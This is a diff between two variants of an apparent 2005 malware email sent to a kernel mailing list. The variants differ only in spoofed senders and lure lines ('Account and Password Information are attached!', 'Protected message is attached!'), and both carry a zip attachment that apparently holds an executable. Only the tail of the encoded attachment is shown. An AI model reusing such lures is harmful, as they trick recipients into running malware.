@@ -1,26 +1,26 @@
-From: webmaster@dynamicdancers.co.uk
+From: hostmaster@bitgate.com
 Subject: Registration Confirmation
-Date: Tue, 20 Dec 2005 00:41:19 GMT
-Message-ID: <20cd.d271fa23cf0cb3d@dynamicdancers.co.uk>
+Date: Tue, 20 Dec 2005 01:01:11 GMT
+Message-ID: <b67e06afa.e515b0e@bitgate.com>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="===e931a3ad7e3776efe"
+Content-Type: multipart/mixed; boundary="===75bedb52ad5b1e"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: listening@oss.sgi.com
+To: XFreeMail@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---===e931a3ad7e3776efe
+--===75bedb52ad5b1e
 
-Account and Password Information are attached!
+Protected message is attached!
 
 
-***** Go to: http://www.dynamicdancers.co.uk
-***** Email: postman@dynamicdancers.co.uk
---===e931a3ad7e3776efe
+***** Go to: http://www.bitgate.com
+***** Email: postman@bitgate.com
+--===75bedb52ad5b1e
 Content-Type: application/octet-stream; name=reg_pass-data.zip
 Content-Transfer-Encoding: base64
 Content-Disposition: attachment; filename="reg_pass-data.zip"
@@ -1000,4 +1000,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---===e931a3ad7e3776efe--
+--===75bedb52ad5b1e--
